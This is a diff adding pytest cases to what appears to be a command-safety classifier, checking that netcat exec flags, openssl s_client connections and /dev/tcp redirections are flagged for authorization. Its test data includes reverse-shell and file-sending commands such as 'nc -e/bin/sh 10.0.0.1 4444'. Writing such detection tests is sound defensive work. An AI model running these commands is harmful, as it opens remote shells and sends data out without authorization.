@@ -543,3 +543,98 @@ def test_inline_interpreter_socket_payload_explanation_is_redacted():
     assert "10.0.0.1" not in result.explanation
     assert "4444" not in result.explanation
     assert "socket.socket" not in result.explanation
+
+
+# --- HK.5.6 final-review fix: nc/ncat exec flags in clustered/long/attached form ---
+# `-e`/`--exec`/`-c`/`--sh-exec` as standalone tokens were already caught; a
+# clustered short flag (`-lve`, `-nve`, `-le`), an attached-value long flag
+# (`--exec=...`, `--sh-exec=...`), or `-e` glued to its operand (`-e/bin/sh`)
+# all silently PASSed before this fix.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "ncat --exec=/bin/sh 10.0.0.1 4444",
+        "ncat --sh-exec='/bin/sh -i' 10.0.0.1 4444",
+        "nc -lve /bin/sh -p 4444",
+        "nc -le /bin/sh 10.0.0.1 4444",
+        "nc -nve /bin/sh 10.0.0.1 4444",
+        "nc -e/bin/sh 10.0.0.1 4444",
+    ],
+)
+def test_nc_clustered_and_attached_exec_flags_require_auth(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.raw_socket_channel in result.reason_codes
+
+
+def test_nc_bare_port_probe_still_passes():
+    # -zv has neither 'e' nor 'c' in the cluster -> must not false-positive.
+    assert _cmd("nc -zv host 22").verdict is Verdict.PASS
+
+
+# --- HK.5.6 final-review fix: openssl s_client without -connect ----------------
+# The original check required a literal `-connect` token; `-host`/`-port`,
+# `-proxy`, and `-unix` name the target just as well and silently PASSed.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "openssl s_client --connect 10.0.0.1:443",
+        "openssl s_client -host 10.0.0.1 -port 443",
+    ],
+)
+def test_openssl_s_client_without_dash_connect_flag_requires_auth(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.raw_socket_channel in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["openssl version", "openssl rand -hex 8", "openssl x509 -in cert.pem -text"],
+)
+def test_openssl_non_s_client_subcommands_pass(command):
+    assert _cmd(command).verdict is Verdict.PASS
+
+
+# --- HK.5.6 final-review fix: /dev/tcp lost via env-assignment token stripping --
+# `_classify_line` scanned the shlex-stripped argv, so an env-assignment token
+# carrying the /dev/tcp path (`D=/dev/tcp/...`) never survived to the check.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "D=/dev/tcp/10.0.0.1/4444; cat f > $D",
+        "TARGET=/dev/tcp/10.0.0.1/4444 cat f",
+    ],
+)
+def test_dev_tcp_survives_env_assignment_token_stripping(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.raw_socket_channel in result.reason_codes
+
+
+# --- HK.5.6 final-review fix: _INLINE_SOCKET_OP over-fired on non-network calls -
+
+
+def test_inline_urllib_parse_only_payload_passes():
+    result = _cmd("python -c \"import urllib.parse;print(urllib.parse.quote('a b'))\"")
+    assert result.verdict is Verdict.PASS
+
+
+def test_inline_sqlite3_connect_still_steps_up():
+    # Bare `connect(` is spec-mandated and intentionally kept broad (it also
+    # matches a non-network `sqlite3.connect(...)`); documented in the README
+    # known-limitations entry for raw_socket_channel/opaque_command.
+    result = _cmd("python -c \"import sqlite3;sqlite3.connect('a.db')\"")
+    assert result.verdict is Verdict.AUTH
+
+
+def test_inline_create_connection_requires_auth():
+    result = _cmd("python -c \"import socket as k;k.create_connection(('h',443))\"")
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.opaque_command in result.reason_codes
